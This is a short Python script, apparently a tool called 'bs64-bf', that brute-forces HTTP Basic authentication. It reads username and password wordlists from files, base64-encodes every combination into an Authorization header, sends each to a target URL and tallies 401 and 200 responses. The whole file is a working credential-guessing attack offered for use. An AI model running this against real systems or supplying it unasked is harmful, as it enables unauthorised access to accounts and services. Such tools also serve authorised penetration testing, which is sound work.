import base64
import requests
import os
import sys
from art import *

unauthcount = 0
authcount = 0

tprint("b s 6 4 - b f", font="random-large")
print("--------------------------------------")
print("Developed by: Navid Fazle Rabbi (DL28)")
print("--------------------------------------")

with open (sys.argv[2], 'r') as users:
    lst1 = users.read()
    userlst = lst1.splitlines()

with open (sys.argv[3], 'r') as pswrds:
    lst2 = pswrds.read()
    passlist = lst2.splitlines()

# print(userlst)
# print(passlist)

for i in userlst:
    for j in passlist:    
        msg = i+':'+j
        print("------------------")
        print(f'username:password -- {msg}')

        msg_bytes = msg.encode('ascii')
        bs64_bytes = base64.b64encode(msg_bytes)
        bs64_msg = bs64_bytes.decode('ascii')

        print (f'bs64 -- {bs64_msg}')
        
        authval = 'Basic ' + bs64_msg
        
        print(authval)
        
        headers = {
        'Authorization':authval,
        'Accept':'*/*'
        }
        
        response = requests.get(sys.argv[1], headers=headers)
        print(response.status_code)
        print("------------------")
        
        if (response.status_code == 401):
            unauthcount += 1
        if (response.status_code == 200):
            authcount +=1

print(f"401: {unauthcount}")
print(f"200: {authcount}")